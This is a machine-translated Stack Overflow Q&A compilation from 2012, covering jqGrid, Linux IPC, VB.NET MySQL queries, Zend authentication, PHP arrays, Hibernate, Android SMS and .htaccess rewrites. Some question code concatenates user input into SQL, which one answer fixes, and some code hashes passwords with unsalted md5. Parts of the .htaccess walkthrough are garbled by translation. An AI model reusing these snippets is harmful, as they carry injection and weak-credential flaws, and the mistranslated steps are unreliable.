当我单击“删除行”按钮时，它会调用我的 jquery 函数，但它不会删除我的行。（请参阅我下面的代码）。我想我无法使用自定义按钮获取 row_id。这就是我无法删除的原因。我不知道有什么解决方案。

## 主要代码：

```
<script type="text/javascript">
    $.subscribe('rowdelete', function(event,data) {
        alert("function is calling on the delte button click");
        $("#gridtable").jqGrid('delGridRow',"row_id_s", {height:200,reloadAfterSubmit:true});
    });
    </script>
    <br/>
    <sj:submit id="grid_edit_addbutton" value="Add Row" onClickTopics="rowadd" button="true"/> 
    <sj:submit id="del_gridtable" value="delete Row" onClickTopics="rowdelete" button="true"/> 
```

## 完整代码：

```
<sjg:grid
 id="gridtable"
 caption="List of Subject Details"
 dataType="json"
 href="%{remoteurl}"
 pager="true"
 gridModel="gridModel"
 onClickGroupTopics="rowadd,rowdelete">
    <sjg:gridColumn name="id" index="subjectId" title="ID" formatter="integer" sortable="true" key="true" search="false"  editable="true"  hidden="true" /> 
    <sjg:gridColumn name="subjectName" index="subjectName" title="Subject Name" sortable="true" search="true" editable="true" edittype="text" />
</sjg:grid>

<script type="text/javascript">
    $.subscribe('rowdelete', function(event,data) {
    alert("function is calling on the delte button click");
    $("#gridtable").jqGrid('delGridRow',"row_id_s",{height:200,reloadAfterSubmit:true});
    });
</script>
<br/>
<sj:submit id="grid_edit_addbutton" value="Add Row" onClickTopics="rowadd" button="true"/> 
<sj:submit id="del_gridtable" value="delete Row" onClickTopics="rowdelete" button="true"/> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-05T16:32:40.563

You can put the id in a PROPERTY tag and when you click at the button refresh the datagrid ( by execution the action for ex or refreshing the div that contains it )

# c++ - 正在运行的进程的 CLI 命令

> ID：13061647
> 
> 赞同：0
> 
> 时间：2012-10-25T04:39:53.910
> 
> 标签：c++, linux

1.  GDB 如何实现将自身附加到正在运行的进程的壮举？

2.  我需要类似的功能，我可以向正在运行的进程发出 CLI 命令。例如，我可以查询进程内部状态，例如 show total_messages_processed? 我如何构建对在 linux 下向正在运行的进程发出命令的支持？

3.  是否有一个库可以为正在运行的进程提供 CLI 通信能力并且可以扩展自定义命令？

该过程本身是用c ++编写的

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T04:44:40.720

GDB 不使用 CLI 与其被调试者通信；它使用[`ptrace`](http://en.wikipedia.org/wiki/Ptrace)系统调用/API。

CLI 的意思是“命令行界面”。进程之间最简单的通信形式是`stdin`/ `stdout`。这是通过管道实现的。例如：

```
ps -ef | grep 'httpd' 
```

的标准输出`ps`（将是一个进程列表）连接到 的标准输入`grep`，后者将逐行处理该进程列表输出。

您是在编写这两个程序，还是想与一个已经存在的进程进行通信？我不知道“show total_messages_processed”在没有上下文的情况下是什么意思。

* * *

如果你只是想让程序传达一些状态，一个好的方法是`dd`：向进程发送`SIGUSR1`信号导致它转储其当前统计信息`stderr`并继续处理：

```
$ dd if=/dev/zero of=/dev/null&
[1] 19716
$ pid=$!
$ kill -usr1 $pid
$ 10838746+0 records in
10838746+0 records out
5549437952 bytes (5.5 GB) copied, 9.8995 s, 561 MB/s 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T04:54:47.987

您是否考虑在您的进程中使用[AF_UNIX](http://www.kernel.org/doc/man-pages/online/pages/man7/unix.7.html)套接字？还是[D 总线](http://www.freedesktop.org/wiki/Software/dbus)？或使其成为 HTTP 服务器（例如使用[libonion](http://coralbits.com/staticc/libonion/html/)或[libmicrohttpd](http://www.gnu.org/software/libmicrohttpd/)），可能用于[SOAP](http://en.wikipedia.org/wiki/SOAP)或[RCP/XDR](http://en.wikipedia.org/wiki/Open_Network_Computing_Remote_Procedure_Call)

阅读一些关于[高级 Linux 编程](http://advancedlinuxprogramming.com/)或[高级 Unix 编程](http://basepath.com/aup/)的书籍；你肯定想使用（也许是间接的）一些像[poll(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/poll.2.html)这样的多路复用系统调用，也许在像[libev](http://software.schmorp.de/pkg/libev.html)这样的事件库之上。也许你想为此专门写一个线程。

如果不知道您在考虑什么样的流程，我们无法提供更多信息。您可能需要重新设计其中的某些部分。如果进程是一些传统的计算密集型的东西，它与 SMTP 服务器进程不同。特别是，如果您在流程中有一些事件循环，请使用并扩展它以进行监控。如果您没有任何事件循环（例如在传统的数字运算“批处理”应用程序中），您可能需要添加一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T04:55:42.960

在这种情况下，我建议使用“fork”，它将当前运行的进程分成两个。父进程将读取标准输入、处理命令并能够处理两个进程之间共享的所有内存。从理论上讲，甚至可以跳过高级形式的*进程间通信*：锁、互斥体、信号量、信号、套接字或管道——但要做好准备，*子*进程不一定将其状态写入内存，而是将其保存在寄存器中。

在 fork 操作系统会复制进程局部变量，之后每个进程都有自己的内部状态——因此传递数据的最简单方法是分配“共享内存”。

还可以将信号处理程序写入子进程，该处理程序进入*睡眠/等待状态*并仅在另一个信号时退出——这样就可以有更多时间检查子进程的内部状态。这种方法的主要原理是不必让正在调试的进程意识到正在被调试：父进程和子进程共享相同的代码库，父进程实现必要的输出方法（格式化筛选？）和序列化数据等。

# mysql - 带有 mysql 的数据网格

> ID：13061648
> 
> 赞同：0
> 
> 时间：2012-10-25T04:40:00.680
> 
> 标签：mysql, sql, vb.net

我正在尝试使用此代码显示在根据先前标记的字段研究信息的网格上

```
SQL = "SELECT * FROM funcionario WHERE setor ='" + TxtPesq.Text + "'"
                myCommand.Connection = conn
                myCommand.CommandText = SQL
                myAdapter.SelectCommand = myCommand
                myAdapter.Fill(myData)
                DataGridView1.DataSource = myData 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:46:42.253

*   使用`using`声明正确处理对象。
*   参数化您的查询以避免sql注入

完整代码

```
Dim dSet As New Dataset
Dim SQL AS String= "SELECT * FROM funcionario WHERE setor = @setor"
Using conn As New MySqlConnection("connectionStr HERE")
    Using myCommand As New MysqlCommand()
        With MyCommand
            .Connection = conn
            .CommandText = SQL
            .CommandType = CommandType.Text
            .Parameters.AddWithValue("@setor", TxtPesq.Text) 
        End With
        Using myAdapter As New MySQLDataAdapter(myCommand)
            Try
                myAdapter.Fill(dset)
                DataGridView1.DataSource = dset.tables(0)
            Catch(ex as MySQLException)
                Msgbox (ex.Messge)
            End Try
        End Using
    ENd Using
ENd Using 
```

# javascript - CSS -webkit-filter 在 Chrome 22.0 中不起作用

> ID：13061652
> 
> 赞同：1
> 
> 时间：2012-10-25T04:40:14.433
> 
> 标签：javascript, css, google-chrome, filter, webkit

我有这个代码，但它不工作 Chrome 22.0.1229.94 m。

```
<div id='botonera'>
    <button id='restaurar'>Restaurar</button>
    <button id='blur'>Blur</button>
    <button id='greyscale'>Greyscale</button>
    <button id='sepia'>Sepia</button>
</div>

<script type="text/javascript">
    var imagen = document.getElementById('imagen');

    document.getElementById('restaurar').onclick = function() {
        imagen.className = 'restaurar';
    }
    document.getElementById('blur').onclick = function() {
        imagen.className = 'blur';
    }
    document.getElementById('greyscale').onclick = function() {
        imagen.className = 'greyscale';
    }
    document.getElementById('sepia').onclick = function() {
        imagen.className = 'sepia';
    }
</script> 
```

只有灰度不起作用，模糊，棕褐色“恢复”工作正常。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:41:49.573

您的拼写可能与您的 CSS 中的一样。两种拼写都是正确的，但只有第一个可以使用。`gr**a**yscale``gr**e**yscale`

```
.greyscale {  
   -webkit-filter: grayscale(100%);
} 
```

# iphone - Objective-C：用大量文本分割类的方法

> ID：13061653
> 
> 赞同：0
> 
> 时间：2012-10-25T04:40:15.127
> 
> 标签：iphone, objective-c, ios, xcode, cocoa-touch

我有一个为一堆图形加载绘图代码的类。它有点像这样：

```
if (type == RabbitGraphic)
{
     //a whole bunch of drawing code gets loaded into an object
}
else if (type == FrogGraphic)... 
```

这个文件变得很长，我添加了更多的图形，编译/加载文件需要一段时间。我想知道，有没有一种方法可以将这些图形拆分为单独的文件而无需创建新对象？IE 是否有一些我可以做的机制：

```
if (type == RabbitGraphic)
{
      load file that has rabbit graphic code
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T04:49:30.830

你为什么要避免创建一个新对象？在我看来，这里需要更多的 OOP。您应该有单独的类来实现特定于每种类型的各种图形代码，可以选择使用实现通用功能的父类。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:45:02.427

我会将您所有的图形放在一个数据库中并通过网络加载它们 - 更容易维护并且不会影响移动设备上如此宝贵的磁盘空间。查看 heroku 教程并运行它。归根结底，它是应用程序堆栈到客户端层的出色设计，并且可以免费开发！

[iOS 中的图像和应用程序/任何可以执行 HTTP 的端点](https://devcenter.heroku.com/articles/ios-photo-sharing-geo-location-service)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T05:46:07.203

我想您可能正在寻找[objective-c categories](http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/objectivec/chapters/occategories.html)。它的要点是您可以像这样声明接口和实现：

```
@interface MyMainClass
@end 
```

然后在另一个文件中，通常称为 MyMainClass+OtherStuff.h

```
@interface MyMainClass (OtherStuff)
@end 
```

与@implementation 类似。该语法允许您做您正在寻找的事情：将相关方法分组到单独的模块中，而无需跨越类。

# iphone - 如何在没有新版本的情况下更新应用商店上的应用？

> ID：13061657
> 
> 赞同：4
> 
> 时间：2012-10-25T04:40:52.417
> 
> 标签：iphone, ios, xcode, app-store

我在应用商店上传了一个应用。而且我只是忘记删除其中的警报。现在我只想更新没有新版本的旧应用程序。所以请帮助我做到这一点。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T04:43:54.413

你不能。您必须提交新版本以供审核。此新版本的版本号必须高于当前版本。没有办法简单地更新应用程序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T04:49:46.970

只有两种方式可以在 App Store 上上传相同的应用程序：

*   上传新版本。
*   您必须删除旧应用并上传新应用。在这种情况下，您的等待队列将从第一天开始。例如：如果您在 2 天前上传了您的应用程序，如果您现在将其删除并上传新版本，您将回到第 0 天，您将不得不再等待 7 天。

如果您的警报不是很重要，则上传新版本是个好主意。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T05:09:54.700

如果您上传的版本尚未获得批准且仍在审核中，您可以转到“二进制详细信息”页面并“拒绝二进制”，然后您的应用程序的状态将更改为“开发者被拒绝”。在这种情况下，您可以重新上传具有相同版本号的新二进制文件。

如果版本已获得批准，您只需创建一个新版本。

# php - 使用 php 脚本在 csv 文件中插入图像

> ID：13061660
> 
> 赞同：4
> 
> 时间：2012-10-25T04:41:32.440
> 
> 标签：php, excel, csv

> **可能重复：**
> [PHP 代码可以将图像插入 excel 文件并在 MS Excel 中正确打开？](https://stackoverflow.com/questions/11337142/php-code-can-insert-image-to-excel-file-and-open-it-correctly-in-ms-excel)

我想在`.csv`PHP 脚本的帮助下在文件中添加图像。我也不知道有没有可能。

![在此处输入图像描述](../Images/2dbfd089e06b8d62a86282bc29b3c1d2.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T04:51:02.777

不，这是不可能的。根据规范，[CSV 文件](http://en.wikipedia.org/wiki/Comma-separated_values)是基于文本的，它们没有图像或其他类型的二进制数据。

因此，除非生成器和阅读器都同意一种格式，例如[Data-URI](http://en.wikipedia.org/wiki/Data_URI_scheme)，否则无法包含图形数据。

您可能想要创建不同类型的文件，例如电子表格（.odt、.xls/.xlsx），但这些不是您要求的 CSV 文件。

# zend-framework - Zend 身份验证返回白屏

> ID：13061661
> 
> 赞同：1
> 
> 时间：2012-10-25T04:41:34.937
> 
> 标签：zend-framework, zend-auth

这是有史以来最令人沮丧的。当你得到的只是一个白屏时，几乎不可能找到错误！！！

此代码用于其他项目，并且在语法上可以正常工作，它是正确的。但是配置中一定有问题...

这是代码：

```
protected function _process($values)
{
    // Get our authentication adapter and check credentials
    $adapter = $this->_getAuthAdapter();
    $adapter->setIdentity($values['username']);
    $adapter->setCredential($values['password']);

    $auth = Zend_Auth::getInstance();
    $result = $auth->authenticate($adapter);

    if ($result->isValid()) {
        $user = $adapter->getResultRowObject();
        $auth->getStorage()->write($user);
        return true;
    }
    return false;
}

protected function _getAuthAdapter()
{
    $dbAdapter = Zend_Db_Table::getDefaultAdapter();
    $authAdapter = new Zend_Auth_Adapter_DbTable($dbAdapter);
    $authAdapter->setTableName('Users')
                ->setIdentityColumn('username')
                ->setCredentialColumn('password')
                ->setCredentialTreatment('md5(?)');
    return $authAdapter;
} 
```

这是在我的身份验证控制器中，并在我设置适配器等后被调用。如果我放了一个 die("foo"); 在 $result 行之前，我看到了。如果我把它放在 $result 行之后，我会得到一个 WSOD 并且系统停止。我知道这里没有足够的人来调试我的代码，但我希望其他人有这个问题，并且可以给我一个提示，告诉我如何解决这个问题？？？我已经仔细检查了数据库、列名等。我需要知道什么样的事情可能会导致这条线：

```
$result = $auth->authenticate($adapter); 
```

导致白屏死机？？？有任何想法吗？我在 application.ini 中打开了所有错误显示。

我在这台服务器上运行 Zend 1.11.12。这有什么区别吗？它正在运行的服务器正在运行 1.12.0-9

感谢您可能有的任何想法。

编辑::: 我为我的 _getAuthAdapter 添加了代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:24:36.593

为您的应用启用错误报告。在 configs/application.ini 文件中将所有错误报告设置为 1 -

```
 phpSettings.display_startup_errors = 1
   phpSettings.display_errors = 1
   resources.frontController.params.displayExceptions = 1 
```

此外，不要返回 true 或 false，而是尝试打印消息，或重定向到不同的页面以了解。

在 $adapter 上尝试 var_dump 以查看生成的对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:38:25.933

我从来没有使用`Zend_Auth`过身份验证。你应该可以用你的适配器来做到这一点。（假设您`$adapter`是例如的一个实例`Zend_Auth_Adapter_DbTable`）

```
$adapter = $this->_getAuthAdapter();

// this will tell you if there's something wrong with your adapter
if (!($adapter instanceof Zend_Auth_Adapter_DbTable)) {
    throw new Exception('invalid adapter');
}

$adapter->setIdentity($values['username']);
$adapter->setCredential($values['password']);

$result = $adapter->authenticate();
if ($result->isValid()) {

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T05:39:27.413

我试过如下，

```
 public function loginAction() {
        $this->_helper->layout->disableLayout();
        $users = new Application_Model_DbTable_Admin();
        $this->_redirector = $this->_helper->getHelper('Redirector');
        $form = new Application_Form_LoginForm();
        $this->view->form = $form;

        if ($this->getRequest()->isPost()) {
            if ($form->isValid($_POST)) {
                $consumer = new Zend_OpenId_Consumer();
                $username = $this->_request->getPost('username');
                $password = $this->_request->getPost('password');

                if ($username <> '' && $password <> '') {
                    $auth = Zend_Auth::getInstance();
                    $authAdapter = new Zend_Auth_Adapter_DbTable($users->getAdapter(), 'admin');
                    $authAdapter->setIdentityColumn('username')
                            ->setCredentialColumn('password');
                    $authAdapter->setIdentity($username)
                            ->setCredential(md5($password));
                    $result = $auth->authenticate($authAdapter);

                    if ($result->isValid()) {
                        $storage = new Zend_Auth_Storage_Session();
                        $storage->write($authAdapter->getResultRowObject());
                        $this->_auth_user = $auth->getStorage()->read();
                        $this->_redirect('admin/index/');
                    }
                    else
                        $this->view->errorMessage = "Invalid username or password. Please try again.";
                }
                else
                    $this->view->errorMessage = "Username or password should not be empty!!!.";
            }
        }
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T06:06:22.217

如果您的适配器不起作用，请尝试：

```
public function _getAuthAdapter() {
        $authAdapter = new Zend_Auth_Adapter_DbTable(Zend_Db_Table::getDefaultAdapter());
        $authAdapter->setTableName('table_name')
                ->setIdentityColumn('user_name')
                ->setCredentialColumn('password');
        return $authAdapter;
} 
```

在 application.ini

```
resources.db.isDefaultTableAdapter = true 
```

# php - 递归分解PHP中的数组

> ID：13061681
> 
> 赞同：0
> 
> 时间：2012-10-25T04:43:23.320
> 
> 标签：php, arrays, json

```
{ 
    "ServiceCurrentlyPlaying": {
        "fn": "Slideshow-41958.mp4",
        "apps": {
            "ServiceCurrentlyPlaying": {
                "state": "stopped"
            }
        }
    }
} 
```

我将如何从数组中破坏任何名为 ServiceCurrentlyPlaying 的东西？（来自`json_decode(file, TRUE)`）对于任何知道它的人来说，这可能是一个简单的问题，但是我一直在尝试做一些不涉及手动将每个数组硬编码到另一个空数组中的事情（就像`foreach ($outer as $inner)`我正在做的很多一样但是由于嵌套数量不同而出现问题）

注意：我必须处理大约 41958 个文件，它们都有不同的嵌套级别、不同的数量和结构，所以..

我想要的结果是：

```
{
    "fn": "Slideshow-41958.mp4",
    "apps": {
    "state": "stopped"
    }
} 
```

谢谢，非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:47:52.977

采用

```
 $array=json_decode($jsondata);
    $i=0;
    foreach($array as $key=>$arr)
    {
     $out[$i]['fn']=$arr['fn'];
    $out[$i]['apps]=$arr['apps']['ServiceCurrentlyPlaying']

    $i++;
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:20:48.740

也许不是很优化，但这就是想法。

```
$data = json_decode('{ "ServiceCurrentlyPlaying": { "fn": "Slideshow-41958.mp4", "apps": { "ServiceCurrentlyPlaying": { "state": "stopped" } } } }', true);
$modifiedData = breakArray($data);

function breakArray($arr) {
  if(is_array($arr) && sizeof($arr)>0) {
    $buffer = array();

    foreach($arr as $key=>$value) {
      if($key==="ServiceCurrentlyPlaying") {
        if(is_array($value)) $buffer = array_merge($buffer, breakArray($value));
      } else {
        $buffer[$key] = (is_array($value) ? breakArray($value) : $value);
      }
    }

    return $buffer;
  } else {
    return $arr;
  }
} 
```

# .net - “价值不在预期范围内。” 将excel导出为pdf时出错

> ID：13061690
> 
> 赞同：6
> 
> 时间：2012-10-25T04:44:08.760
> 
> 标签：.net, vb.net, ms-office, export-to-pdf

尝试将 excel 2007(xlsx) 格式的工作簿导出为 pdf 时出现上述错误。该工作簿仅包含一张工作表，并且我的 Windows 7 PC 上安装了 Ms Office 2007。这是堆栈跟踪

```
 at Microsoft.Office.Interop.Excel.WorkbookClass.ExportAsFixedFormat(XlFixedFormatType Type, Object Filename, Object Quality, Object IncludeDocProperties, Object IgnorePrintAreas, Object From, Object To, Object OpenAfterPublish, Object FixedFormatExtClassPtr)

at schoolwisereportprint.converttopdf() in    
C:\Users\username\Desktop\Dpp2012New\schoolwisereportprint.aspx.vb:line 33

at schoolwisereportprint.Button1_Click(Object sender, EventArgs e) in C:\Users\username\Desktop\Dpp2012New\schoolwisereportprint.aspx.vb:line 158 
```

这是我的 converttopdf() 函数：

```
Public Sub converttopdf()
    Dim fileName As String = Server.MapPath("rahulserver/pdfreprt.xlsx")
    Dim xlsApp = New Microsoft.Office.Interop.Excel.Application
    xlsApp.ScreenUpdating = False
    Dim xlsBook As Microsoft.Office.Interop.Excel.Workbook
    Dim paramExportFormat As XlFixedFormatType = XlFixedFormatType.xlTypePDF
    Dim paramExportQuality As XlFixedFormatQuality = XlFixedFormatQuality.xlQualityStandard
    Dim paramOpenAfterPublish As Boolean = False
    Dim paramIncludeDocProps As Boolean = True
    Dim paramIgnorePrintAreas As Boolean = True
    Dim paramFromPage As Object = Type.Missing
    Dim paramToPage As Object = Type.Missing
    xlsBook = xlsApp.Workbooks.Open(fileName, UpdateLinks:=False, ReadOnly:=False)
    xlsBook.ExportAsFixedFormat(paramExportFormat, "rahulserver/pdfreprt" & ".pdf", paramExportQuality, paramIncludeDocProps, paramIgnorePrintAreas,paramFromPage, paramToPage, paramOpenAfterPublish)
    xlsBook.Close(SaveChanges:=False)
    xlsApp.Quit()
    MsgBox("successfully converted to pdf!")
End Sub 
```

即使将 paramFromPage 和 paramToPage 分别更改为 1 和 1 也无济于事。我已经花了一整天的时间来解决这个错误，但找不到方法。现在我期待着让我摆脱这个......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-14T15:53:35.423

刚刚意识到这是一个非常古老的问题。顺便说一句，问题是 OP 没有安装“2007 Microsoft Office 插件：Microsoft 另存为 PDF”插件。

你可以在[这里找到](http://www.microsoft.com/en-us/download/details.aspx?id=9943)

# hibernate - 在休眠中注册用户类型的属性名称是什么

> ID：13061691
> 
> 赞同：4
> 
> 时间：2012-10-25T04:44:09.943
> 
> 标签：hibernate, usertype, hibernate.cfg.xml

根据休眠文档：**第 6.5 节。类型注册表**： [http ://docs.jboss.org/hibernate/orm/3.6/reference/en-US/html/types.html](http://docs.jboss.org/hibernate/orm/3.6/reference/en-US/html/types.html)

我们可以创建一个新的用户类型并覆盖现有的 hibernate 的基本类型。要使用新的用户类型，我们需要使用（见上面的链接）注册它：

```
Configuration cfg = ...;
cfg.registerTypeOverride( new SuperDuperStringType() ); 
```

但是从来没有在文档中提到我们如何在 hibernate.cfg.xml 中注册它？我不敢相信他们忘记将其添加到 hibernate.cfg.xml 中，有人知道吗？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T19:09:31.190

抱歉，有遗漏。该文档描述了注册表和密钥，但在一定程度上希望用户能够推断出 1+1=2。我会更明确地说明这一点。

[http://docs.jboss.org/hibernate/orm/3.6/reference/en-US/html/types.html#types-value-basic](http://docs.jboss.org/hibernate/orm/3.6/reference/en-US/html/types.html#types-value-basic)描述内置注册密钥。

正如您在该部分中看到的那样，注册表中的默认映射`java.lang.String`是 to `org.hibernate.type.StringType`。因此，当 Hibernate 看到其 java 类型为它的属性时，它会使用“注册键”`java.lang.String`查看此注册表。`java.lang.String`同样，这都是默认的；如果您愿意，您仍然可以为每个属性提供明确的类型信息。这在文档的其他地方进行了描述。基本上你会使用`@Type`or `<type/>`。

如果您希望 Hibernate 在`SuperDuperStringType`没有提供明确类型信息的任何时候使用您的，您可以使用 "java.lang.String" 作为`SuperDuperStringType`'s `getRegistrationKeys()`：

```
public class SuperDuperStringType implements BasicType {
    ...

    @Override
    public String[] getRegistrationKeys() {
        // lets use delegation and register ourselves under all of StringType's keys
        return org.hibernate.type.StringType.INSTANCE.getRegistrationKeys();
    }
} 
```

在这种情况下，映射中不需要任何明确的内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T15:39:31.087

看看那个帖子：[Mapping A Custom Type In Hibernate](http://alenovarini.wikidot.com/mapping-a-custom-type-in-hibernate)

通过以下小的修改，它对我有用：

hibernate-mapping 结束标签的格式错误，它错过了`/`（斜线）。

从此，它解释了一切。

# android - 如何获取选定的微调器项目并通过短信发送

> ID：13061692
> 
> 赞同：0
> 
> 时间：2012-10-25T04:44:10.147
> 
> 标签：android, android-spinner

我是这里的 Android 新手，我不知道如何通过按下按钮将选定的微调器文本作为 SMS 文本传递给 SMS 以发送到选定的号码。如果有人可以在这里教我，我很高兴。

```
public class MainActivity extends Activity { //all starts here
    String[] location;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        location = getResources().getStringArray(R.array.location_array);
        Spinner s1 = (Spinner) findViewById(R.id.spinner1);
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_single_choice, location);
        s1.setAdapter(adapter);
        s1.setOnItemSelectedListener(new OnItemSelectedListener()
        {
            public void onItemSelected(AdapterView<?> arg0, View arg1, int arg2, long arg3)
            {
                int index = arg0.getSelectedItemPosition();
                Toast.makeText(getBaseContext(), "You have selected " + location[index], Toast.LENGTH_SHORT).show();

            }

            public void onNothingSelected(AdapterView<?> arg0){}

        });
    }

        public void onClick(View v) {          //<--**HERE IS THE PROBLEM**
        sendSMS("5556", "+location [index]"); //<--**HERE IS THE PROBLEM**
    }

    //?sends an SMS message to another device?
    private void sendSMS(String phoneNumber, String message)
    {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(phoneNumber, null, message, null, null);
    }

} 
```

//-必须在这里结束

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T07:33:21.767

把这个放进`sendSMS("5556", "+location [index]");`去

```
public void onItemSelected(AdapterView<?> arg0, View arg1, int arg2, long arg3)
            {

                Toast.makeText(getBaseContext(), "You have selected " + location[arg2], Toast.LENGTH_SHORT).show();
                sendSMS("5556", location[arg2]);
            } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T07:33:17.677

首先将选定的值保存在一个字符串变量中，然后发送到 SMS 中，另一个选项是在函数`int index`外声明变量 `onItemSelected()`，抱歉我的英语交流不好，但它会解决您的问题，请参阅下面的链接以获取更多信息。

[Android 中的微调器](http://creatiosoft.com/forum/showthread.php?tid=135&pid=143#pid143)

并使用下面的代码而不是您的代码。

```
public class MainActivity extends Activity { //all starts here
    String[] location;
    int index;
    String mSelectedItem;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        location = getResources().getStringArray(R.array.location_array);
        Spinner s1 = (Spinner) findViewById(R.id.spinner1);
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_single_choice, location);
        s1.setAdapter(adapter);
        s1.setOnItemSelectedListener(new OnItemSelectedListener()
        {
            public void onItemSelected(AdapterView<?> arg0, View arg1, int arg2, long arg3)
            {
                index = arg0.getSelectedItemPosition();
                //OR you can also store selected item using below line.
                mSelectedItem=arg0.getSelectedItem().toString();
                Toast.makeText(getBaseContext(), "You have selected " + location[index], Toast.LENGTH_SHORT).show();
            }

            public void onNothingSelected(AdapterView<?> arg0){

            }

        });
    }

    public void onClick(View v) {
        sendSMS("5556", location [index]);
        //OR you can also send sms using below code.
        sendSMS("5556", mSelectedItem);
    }    

    //?sends an SMS message to another device?
    private void sendSMS(String phoneNumber, String message)
    {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(phoneNumber, null, message, null, null);
    }
} 
```

# javascript - 当我刷新页面时，弹出窗口会显示一秒钟。

> ID：13061693
> 
> 赞同：0
> 
> 时间：2012-10-25T04:44:15.063
> 
> 标签：javascript, html, css

**脚本**

```
 $(document).ready(function(){
     $(".aboutBtn").click(function () {
            $(".aboutContent").slideToggle("slow");
   });

  $(".contact").click(function () {
            $(".aboutContent").slideToggle("slow");
      });
   }); 
```

**html**

```
<article class="aboutBtn">ABOUT</article> 
```

**CSS**

```
 .aboutBtn{
       width:85px; 
       padding:5px 0px 5px 10px; 
       background-color:#d8531e;
       cursor:pointer;
       color:#ffffff; 
       font-size:20px; 
       text-transform:uppercase;
       position:relative;top:-48px; 
       font-family:"Segoe UI Light";
  } 
```

* * *

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:57:13.933

用您的样式表隐藏弹出窗口。

CSS：

```
.aboutContent{
  display: none;
} 
```

# .htaccess - 友好的网址 .htaccess

> ID：13061699
> 
> 赞同：1
> 
> 时间：2012-10-25T04:44:44.293
> 
> 标签：.htaccess, url, friendly-url

我试图按照[.htaccess 简短而友好的 url](https://stackoverflow.com/questions/11146062/htaccess-short-and-friendly-url)上的说明进行操作，但无法实现这些结果。

如果我使用以下它可以正常工作：

```
RewriteEngine On
RewriteRule ^([^/]*)\.html$ /index.php?page=$1 [L] 
```

但是，如果我使用：

```
RewriteEngine On
RewriteRule ^([^/]*)$ /index.php?page=$1 [L] 
```

我收到内部服务器错误。

我想要实现的只是能够使用[http://website.com/about](http://website.com/about)而不是[http://website.com/about.html](http://website.com/about.html)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T07:03:37.213

这些规则：

```
RewriteEngine On
RewriteRule ^([^/]*)$ /index.php?page=$1 [L] 
```

导致内部重写循环。重写引擎循环遍历所有规则，直到达到内部重定向限制（从而导致 500 服务器错误）或从引擎出来的结果 URI 与进入它的 URI 相同。此外（这是一个非常重要的概念），在将 URI 的前导斜杠*发送到 htaccess 文件中的规则的重写引擎之前，它会*被删除。所以在这里我们有：

1.  提出请求：[http ://domain.com/blah](http://domain.com/blah)
2.  URI = **/废话**
3.  去掉前导斜杠，URI = **blah**
4.  **blah**匹配`^([^/]*)$`，应用规则，URI = **/index.php?page=blah**
5.  **废话**不等于**/index.php**
6.  规则循环，URI = **/index.php**
7.  去除前导斜杠，URI = **index.php**
8.  **index.php**匹配`^([^/]*)$`，应用规则，URI = **/index.php?page=index.php**
9.  **索引**不等于**/index.php**
10.  规则循环，URI = **/index.php**
11.  去除前导斜杠，URI = **index.php**
12.  **index.php**匹配`^([^/]*)$`，应用规则，URI = **/index.php?page=index.php**
13.  **索引**不等于**/index.php**

等等

你有几个选择来处理这个问题。最简单的方法是简单地`/`从您的目标中删除：

```
RewriteRule ^([^/]*)$ index.php?page=$1 [L] 
```

这将使得在上面的步骤 9 中，**索引**将等于**index.php**，从而停止重写过程（在第二次应用之前）。唯一的缺点是如果您需要重定向，或者如果 htaccess 文件被移动，目标中的相对 URI 有时会被误认为是文件路径而不是 URL 路径（apache 猜测这个，有时 apache 猜测错误的）。这可以通过包含一个基础来解决：

```
RewriteBase /
RewriteRule ^([^/]*)$ index.php?page=$1 [L] 
```

您还可以添加条件以使其指向现有资源的 URL 将从应用中排除此规则：

```
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^([^/]*)$ /index.php?page=$1 [L] 
```

因此，如果 URI 指向现有文件或目录，则跳过该规则。因此，在 URI 变为**/index.php**时第一次重写后，由于该文件存在，因此第二次跳过该规则。这也使得对文档根目录中的图像、css、脚本或静态页面的请求不会通过`index.php`. 如果这不是您想要的，如果 URI 已经是 index.php，您也可以直接跳过：

```
RewriteCond %{REQUEST_URI} !^/index.php
RewriteRule ^([^/]*)$ /index.php?page=$1 [L] 
```

